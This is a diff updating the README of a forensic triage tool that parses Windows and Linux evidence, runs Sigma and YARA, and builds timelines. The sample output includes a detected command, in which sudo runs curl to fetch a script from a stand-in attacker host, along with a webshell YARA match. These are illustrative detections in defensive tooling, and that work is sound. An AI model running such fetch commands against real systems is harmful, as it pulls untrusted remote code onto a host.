@@ -11,21 +11,94 @@
 
 [![tests](https://github.com/Cobrastrike62/Inspecthor/actions/workflows/tests.yml/badge.svg)](https://github.com/Cobrastrike62/Inspecthor/actions/workflows/tests.yml)
 
-Point it at forensic evidence. It tells you what happened.
+Forensic triage for Windows and Linux evidence. Point it at a KAPE VHDX, a folder,
+or an HTB Sherlock zip; it parses everything it recognizes, scores what looks
+suspicious, runs Sigma and YARA, and writes a timeline you can read.
 
-> Only use this on evidence you are authorized to examine. Sherlock packages and
-> real incident artifacts can contain live malware — work in a VM.
+> Work in a VM. Sherlock packages and real incident artifacts contain live malware.
+> Only examine evidence you are authorized to examine.
 
-## Run it
+---
+
+## Contents
+
+- [Install](#install) · [Get the Sigma rules](#get-the-sigma-rules) · [Quick start](#quick-start)
+- [Output files](#output-files) · [Reading a row](#reading-a-row) · [Severity levels](#severity-levels)
+- [Commands](#commands) · [Flags](#flags)
+- [KAPE and disk images](#kape-and-disk-images) · [Supported evidence](#supported-evidence)
+- [Your own rules](#your-own-rules) · [Your own parser](#your-own-parser)
+- [Gotchas](#gotchas) · [Performance](#performance)
+
+---
+
+## Install
 
 ```bash
-inspecthor sherlock.zip
+git clone https://github.com/Cobrastrike62/Inspecthor && cd Inspecthor
+./install.sh --full --link
 ```
 
-That's the tool. One command, no flags. It unpacks the archive, works out which
-parser each file needs, reads them all, figures out the host's timezone and the
-year on its own, runs YARA and Sigma, pulls out the indicators, finds the question
-file the package shipped with, and answers it.
+| Flag | Effect |
+|---|---|
+| `--full` | every optional parser and detector (dissect, yara, sigma, scapy, volatility3) |
+| `--windows` | dissect format libs only (evtx, registry, MFT, ESE) |
+| `--detect` | YARA and Sigma only |
+| `--link` | symlink `inspecthor` into `~/.local/bin` |
+| `--pipx` | global command via pipx, no venv to activate |
+| `--trusted-host` | required behind a TLS-intercepting corporate proxy |
+
+Without `--full` you get a stdlib-only install. Text, syslog, JSON and SQLite
+evidence still work; Windows formats don't. When it hits a file it can't read it
+names the extra that unlocks it:
+
+```
+! would parse with evtx — pip install 'inspecthor[evtx]'
+```
+
+Run `inspecthor` with no arguments to list what's available in your install.
+
+**Updating:** `git pull`. The install is editable, so new code is picked up
+immediately. Re-run `./install.sh --full` when a release adds a dependency.
+
+## Get the Sigma rules
+
+**Do this. It is the single biggest difference in output quality.**
+
+inspecthor bundles 6 Sigma rules. [SigmaHQ](https://github.com/SigmaHQ/sigma)
+publishes about 3,300:
+
+```bash
+mkdir -p ~/sigma-rules && cd ~/sigma-rules
+curl -LO https://github.com/SigmaHQ/sigma/releases/latest/download/sigma_all_rules.zip
+unzip -q sigma_all_rules.zip && rm sigma_all_rules.zip
+```
+
+Then pass `--rules` on every run:
+
+```bash
+inspecthor evidence.vhdx --rules ~/sigma-rules
+```
+
+On a real 798,000-event collection that loads **2,935 applicable rules** and adds
+about 5 minutes. It found domain enumeration via `nltest /dclist:`, an NTLMv1 logon,
+and WebDAV over `rundll32` that the built-in scoring did not.
+
+The rules are not vendored because they are DRL-licensed and update constantly.
+Refresh them by re-running the commands above.
+
+> Keep the rules on your Linux filesystem, not `/mnt/c`. WSL charges about 2.4 ms
+> per file for metadata over 9p — roughly 8 seconds of pure `stat` on 3,300 files.
+
+## Quick start
+
+```bash
+inspecthor sherlock.zip --rules ~/sigma-rules
+```
+
+One command. It unpacks the archive, picks a parser per file, derives the host's
+timezone, hostname and year from the evidence itself, scores execution, profiles
+what is rare on the host, runs Sigma and YARA, extracts indicators, and answers any
+question file the package shipped with.
 
 ```
 4 artifact(s) parsed, 10 events, 2 detection(s)
@@ -43,58 +116,62 @@ What stands out
  !!  2024-03-01 09:20:11  web01            yara_match         YARA Inspecthor_Webshell_PHP matched shell.php
  !   2024-03-01 09:16:00  web01  admin     sudo_command       sudo: admin ran /usr/bin/curl http://evil.example.net/x.sh
 
-The evidence came with 4 question(s)  (candidates — verify before submitting)
-
-  What is the attacker's IP address?
-    > 0.80  45.33.32.156   Attacker source IP — ssh_failed_login @ 2024-03-01 09:15:01 (4 occurrences)
-
-  What account did the attacker create?
-    > 0.85  backdoor   Account created by attacker — account_created @ 2024-03-01 09:17:00
-
 Saved
+  triage   pkg-triage.csv    312 rows — start here
+  timeline pkg-timeline.csv  10,204 rows — everything
   report   pkg-report.md
-  timeline pkg-timeline.csv
   case     pkg.db
 ```
 
-Every suggestion shows the event it came from. Nothing is submitted for you, and
-nothing claims to be certain — `>` means it is confident, `·` means look closer.
+For Sherlocks, suggested answers show the event they came from. `>` means confident,
+`·` means look closer. Nothing is submitted for you.
 
-## What it writes, and where
+## Output files
 
-Four files, named after the evidence, in your current directory:
+Four files, named from the evidence path, written to the current directory:
 
-```
-sherlock.zip   ->   sherlock-triage.csv    level >= med — open this one
-                    sherlock-timeline.csv  every event, for grepping
-                    sherlock-report.md     the writeup
-                    sherlock.db            the case
-```
+| File | What it's for |
+|---|---|
+| `<case>-triage.csv` | level ≥ `med`. **Open this one.** |
+| `<case>-timeline.csv` | every event, for `grep` |
+| `<case>-report.md` | the writeup |
+| `<case>.db` | SQLite case file, queried by `ask` / `find` / `timeline` |
 
-Two timelines on purpose. A tool that quietly omits evidence from a file called
-`timeline.csv` is a liability — you would grep it, find nothing, and conclude the
-activity never happened. But nobody opens 800,000 rows either. On a real KAPE
-collection that split was 31,362 triage rows against 797,969 total.
+Both CSVs carry the same columns: `Timestamp, Level, Title, Host, Channel, EventID,
+User, Details, Type, TimestampDesc, ATTCK, Tags, Source, RecordId, ExtraFields,
+ArtifactPath, Id`.
 
-Each row reads as a sentence rather than a JSON blob:
+`--out DIR` writes elsewhere. `--name NAME` names the case yourself.
+
+**Re-running is safe.** Same evidence replaces that case rather than duplicating its
+events. Different evidence that produces the same name gets `evidence-2.db` and says
+so. Files it doesn't recognize as its own cases are never touched.
+
+## Reading a row
 
 ```
 Timestamp            Level  Title              EventID  Details
-2026-06-04 08:19:16  high   Service installed     7045   Svc: Updater Service ¦ Image: C:/…/updater.exe
+2026-06-04 08:19:16  high   Service installed     7045   Svc: Updater Service ¦ Image: C:\…\updater.exe
                                                          --system --windows-service ¦ Type: user mode
                                                          service ¦ Start: auto start ¦ Acct: LocalSystem
 ```
 
-Coded values are decoded in place, keeping the raw value: `Type: 10
-(RemoteInteractive)`, `Status: 0xC000006A (bad password)`.
+`Details` is `Label: value` pairs separated by `¦`. Coded values keep the raw value
+alongside the meaning: `Type: 10 (RemoteInteractive)`, `Status: 0xC000006A (bad
+password)`.
 
-**Where there is no template it shows the raw Windows field names instead** —
-`param1: application-specific ¦ param2: Local Activation`. That difference is the
-point: a curated label means the tool understood the event, a raw Windows name
-means it is only transcribing one. No event ever renders as an empty row or a bare
-noun.
+Two label styles, and the difference is load-bearing:
 
-Every run prints how much it actually recognized, per channel:
+| You see | Meaning |
+|---|---|
+| `TgtUser:`, `SrcIP:`, `Svc:` | curated label — there is a template for this event |
+| `param1:`, `TargetUserName:` | raw Windows field name — no template, fields shown as-is |
+
+Scored rows also carry a `why` explaining the level, e.g. `runs from a user-writable
+path under a machine-generated name (h2cgEzNCsypd, lk9vAU)`.
+
+Each run prints per-channel recognition. A channel at 0% has no template yet — treat
+it as a coverage gap, not a quiet channel:
 
 ```
 Coverage — what was recognized
@@ -105,144 +182,120 @@ Coverage — what was recognized
   SentinelOne/Operational                     35,868     0.0%
 ```
 
-A channel at 0% is not a quiet channel — it is one with no template yet, and the
-tool says so rather than letting a coverage gap look like an absence of activity.
+## Severity levels
 
-The name comes from the evidence path — a file's stem or a folder's name,
-lowercased. `--out DIR` puts them elsewhere, `--name "Brutus"` names them
-yourself.
-
-**It will not overwrite or merge someone else's case.** Two rules:
-
-- Analyze the **same evidence** again and it replaces that case, rather than
-  adding a second copy of every event to it. It says
-  `replacing the previous analysis in sherlock.db`. The case file holds nothing
-  but derived data, so re-deriving it is always safe.
-- Analyze **different evidence** that happens to produce the same name — two
-  Sherlocks both unpacking to a folder called `evidence`, which is common — and
-  the existing case is left alone. You get `evidence-2.db` and it tells you:
-  `evidence.db already holds a different case; using evidence-2.db`.
-
-A file it does not recognize as one of its own cases is never touched.
-
-## Then follow up
-
-Three more commands, all working against the case you just analyzed:
-
-```bash
-inspecthor ask "when did they first log in?"     # answer one question
-inspecthor find 45.33.32.156                     # search every artifact at once
-inspecthor timeline                              # what happened, in order
-```
-
-`timeline --all` gives you everything instead of just the notable events. `find`
-takes `--regex`. That is the whole interface.
-
-## Install
-
-```bash
-git clone https://github.com/Cobrastrike62/Inspecthor && cd Inspecthor
-./install.sh --full --link
-```
-
-`--full` adds every optional parser, `--link` puts the command on your PATH. On a
-corporate network that intercepts TLS, add `--trusted-host`.
-
-Without `--full` you get a stdlib-only install that still handles text, syslog,
-JSON and SQLite evidence — the whole pipeline works, just fewer formats. When it
-meets a file it cannot read, it says which install unlocks it:
-
-```
-! would parse with evtx — pip install 'inspecthor[evtx]'
-```
-
-Run `inspecthor` with no arguments to see what is available.
-
-### Updating
-
-```bash
-cd inspecthor && git pull
-```
-
-The install is editable, so the command picks up new code immediately. Re-run
-`./install.sh --full` as well when a release adds a dependency — it reuses the
-existing venv, so it is cheap to run either way.
-
-## What it reads
-
-| Evidence | Needs |
+| Level | Meaning |
 |---|---|
-| Linux `auth.log`, `secure`, `syslog` — including rotated and gzipped | nothing |
-| Timestamped app logs, Apache/nginx access logs, plain text | nothing |
-| Windows Event Logs — Security, System, PowerShell, Sysmon, Task, RDP, Defender | `--full` |
-| Registry hives — Run keys, services, timezone, USB, UserAssist, amcache | `--full` |
-| **KAPE collections** and disk images — VHDX, VHD, E01, VMDK, QCOW2 | `--full` |
+| `crit` | a service, autorun or task executing from a user-writable path |
+| `high` | credible attacker activity — unusual execution paths, credential access, log clearing |
+| `med` | worth a look; the default floor for `triage.csv` and `timeline` |
+| `low` | recognized and routine |
+| `info` | noise, or an event with no template |
 
-Not yet: `$MFT`/`$J`, prefetch, LNK, SRUM, browser history, PCAP, memory, cloud
-logs. Those are the next parsers. Registry transaction logs (`.LOG1`/`.LOG2`) are
-skipped rather than replayed, so a change a hive has not yet flushed is not visible.
+`high` and `crit` come only from the curated event map and the scorers. Researched
+event templates are capped at `med` — applying a large table of "high" verdicts
+unreviewed produced thousands of false positives in an earlier version.
 
-### KAPE collections
-
-Point it at the VHDX KAPE wrote — no mounting, no extracting first:
+## Commands
 
 ```bash
-inspecthor 2026-07-27T191212_HOSTNAME.vhdx
+inspecthor <evidence>                 # analyze (the word 'analyze' is optional)
+inspecthor ask "when did they log in?"
+inspecthor find 45.33.32.156
+inspecthor timeline
 ```
 
-It opens the container, finds the NTFS volume, and pulls out **only the files it
-can parse**, because a collection is mostly formats there is no parser for yet and
-copying all of it out would waste gigabytes. It tells you what it left behind:
+`ask`, `find` and `timeline` use the newest `.db` in the current directory unless
+you pass `--case FILE`.
 
+```bash
+inspecthor find 'evil\.(com|net)' --regex --limit 50
+inspecthor timeline --min-level high
+inspecthor timeline --all --limit 5000
 ```
-vhdx image: pulled 258 parseable file(s) (917 MB); left behind 516 .pf, 477 .lnk,
-43 .automaticdestinations-ms — no parser for those yet
-```
 
-That is also where the timezone comes from: a KAPE collection includes the
-registry, so the host's real UTC offset and computer name are read out of it
-instead of guessed.
+## Flags
 
-## Why it can skip the flags
+**`analyze`**
 
-Classic syslog lines look like this:
+| Flag | Effect |
+|---|---|
+| `--rules DIR` | your YARA `.yar` and Sigma `.yml` rules, used in addition to the built-ins |
+| `--out DIR` | where to write outputs (default: here) |
+| `--name NAME` | name the case and its files |
+| `--no-detect` | skip the YARA and Sigma pass |
+| `--tz ZONE` | override the derived timezone, e.g. `America/Chicago` |
+| `--year YYYY` | override the derived year |
+| `--host NAME` | override the derived hostname |
+
+The three overrides exist because syslog records neither a year nor a UTC offset:
 
 ```
 Mar  1 09:15:01 web01 sshd[1010]: Failed password for admin from 45.33.32.156
 ```
 
-No year. No UTC offset. Most tools make you supply both, and if you get them
-wrong your Linux timeline silently sits in the wrong year next to your Windows
-events.
+inspecthor parses self-dating evidence first, derives the year from absolute event
+timestamps and the timezone and hostname from the registry, then reads the ambiguous
+files with that context. It prints every derived value and where it came from. Use
+the overrides when it's wrong.
 
-inspecthor reads the rest of the evidence first. Event logs carry absolute UTC
-timestamps, so they pin down the year. The registry records `TimeZoneInformation`
-and `ComputerName`. It parses everything that dates itself, derives the context
-from that, and only then reads the ambiguous files — which is why the normal case
-needs no flags at all.
+**`ask`** — `--case FILE`
 
-It always shows you what it worked out and where each value came from. If it is
-wrong, override it:
+**`find`** — `--regex`, `--limit N` (default 200), `--case FILE`
+
+**`timeline`** — `--all`, `--min-level {info,low,med,high,crit}` (default `med`),
+`--limit N` (default 500), `--case FILE`
+
+## KAPE and disk images
+
+Point it at the VHDX. No mounting, no extracting first:
 
 ```bash
-inspecthor evidence/ --tz America/Chicago --year 2024 --host WS01
+inspecthor 2026-07-27T191212_HOSTNAME.vhdx --rules ~/sigma-rules
 ```
 
-Other flags: `--out DIR` to put the outputs somewhere else, `--no-detect` to skip
-YARA and Sigma, `--rules DIR` to add your own rules. `inspecthor analyze --help`
-lists them.
+It opens the container, finds the NTFS volume, and extracts **only files a parser
+claims** — a collection is mostly formats with no parser yet, and copying it all out
+wastes gigabytes. It reports what it skipped:
 
-## Adding your own detections
+```
+vhdx image: pulled 225 parseable file(s) (839 MB); left behind 516 .pf, 477 .lnk,
+43 .automaticdestinations-ms — no parser for those yet
+```
 
-Drop a `.yar` or Sigma `.yml` into a directory and pass `--rules DIR`. No code.
+A KAPE collection includes the registry, so the timezone and computer name are read
+rather than guessed.
 
-One catch worth knowing: YARA's regex engine has no non-capturing groups. Write
-`(a|b)`, never `(?:a|b)`, or the rule will not compile.
+Also handles VHD, E01, VMDK and QCOW2.
 
-## Adding a parser
+## Supported evidence
 
-One file in `inspecthor/parsers/plugins/`. Nothing else to touch — the registry
-finds it:
+| Evidence | Needs |
+|---|---|
+| Linux `auth.log`, `secure`, `syslog` — rotated and gzipped included | nothing |
+| Timestamped app logs, Apache/nginx access logs, plain text | nothing |
+| Windows Event Logs — Security, System, PowerShell, Sysmon, Task, RDP, Defender | `--full` |
+| Registry hives — Run keys, services, timezone, USB, UserAssist, amcache | `--full` |
+| KAPE collections and disk images — VHDX, VHD, E01, VMDK, QCOW2 | `--full` |
+
+**Not yet:** `$MFT`/`$J`, prefetch, LNK, SRUM, browser history, PCAP, memory, cloud
+logs. Registry transaction logs (`.LOG1`/`.LOG2`) are skipped rather than replayed,
+so unflushed hive changes are invisible.
+
+## Your own rules
+
+Drop `.yar` or Sigma `.yml` files into a directory and pass `--rules DIR`. No code.
+
+Sigma support is a documented subset: field/value maps, lists of maps, the modifiers
+`contains` `startswith` `endswith` `re` `all` `base64` `base64offset` `cased`
+`windash`, and `and` / `or` / `not` / `1 of x` / `all of x` conditions. Aggregations
+(`| count() >`) are not supported; those rules are skipped with a hint rather than
+mis-evaluated.
+
+## Your own parser
+
+One file in `inspecthor/parsers/plugins/`. The registry finds it — nothing else to
+touch:
 
 ```python
 @register
@@ -258,8 +311,37 @@ class PrefetchParser(Parser):
                             message=f"{name} executed (run #{count})")
 ```
 
-[DESIGN.md](DESIGN.md) has the details — the parser contract, the event schema,
-and why the pieces are shaped the way they are.
+Import anything optional *inside* `parse()`, or discovery breaks on a stdlib-only
+install. [DESIGN.md](DESIGN.md) has the parser contract, the event schema, and the
+reasoning behind the architecture.
+
+## Gotchas
+
+**Timestamps are UTC.** Even when inspecthor correctly derives that the host was
+`UTC−05:00`, output is UTC. An incident you remember at 11:50 local appears at
+16:55. Converting output to host-local time is a known gap.
+
+**YARA has no non-capturing groups.** Write `(a|b)`, never `(?:a|b)` — one bad rule
+fails the whole ruleset.
+
+**Keep Sigma rules off `/mnt/c`** under WSL. See
+[Get the Sigma rules](#get-the-sigma-rules).
+
+**Sherlock answers are candidates.** Verify before submitting.
+
+## Performance
+
+Measured on a 2.1 GB KAPE VHDX — 797,972 events, 225 extracted files:
+
+| Stage | Cost |
+|---|---|
+| Parse + score + rarity profile | a few minutes |
+| Sigma, 2,935 applicable rules | 313 s |
+| Case file | 1.9 GB |
+| `triage.csv` / `timeline.csv` | 26 MB / 571 MB |
+
+A Sherlock package is thousands of events, not hundreds of thousands — seconds, not
+minutes.
 
 ## Tests
 
@@ -268,14 +350,14 @@ pytest -q
 ```
 
 Fully offline; every fixture is generated. Passes on a stdlib-only install, with
-the format-specific tests skipping themselves.
+format-specific tests skipping themselves.
 
 ## License and attribution
 
-inspecthor is MIT licensed — see [LICENSE](LICENSE).
+MIT — see [LICENSE](LICENSE).
 
-It bundles a slimmed-down copy of the **MITRE ATT&CK®** Enterprise matrix
-(v19.1) so technique names resolve offline, derived from
+Bundles a slimmed copy of the **MITRE ATT&CK®** Enterprise matrix (v19.1) so
+technique names resolve offline, derived from
 [mitre-attack/attack-stix-data](https://github.com/mitre-attack/attack-stix-data).
 
 > ATT&CK® is a registered trademark of The MITRE Corporation.
@@ -283,6 +365,9 @@ It bundles a slimmed-down copy of the **MITRE ATT&CK®** Enterprise matrix
 > permission of The MITRE Corporation. MITRE does not endorse or sponsor this
 > project.
 
-Optional extras install third-party packages under their own licenses, several of
-them copyleft — see [NOTICE](NOTICE) before redistributing a bundle that includes
-them.
+Optional extras install third-party packages under their own licenses, several
+copyleft — see [NOTICE](NOTICE) before redistributing a bundle that includes them.
+
+Sigma rules fetched from SigmaHQ are licensed under the
+[Detection Rule License](https://github.com/SigmaHQ/sigma/blob/master/LICENSE.Detection.Rules.md)
+and are not distributed with inspecthor.
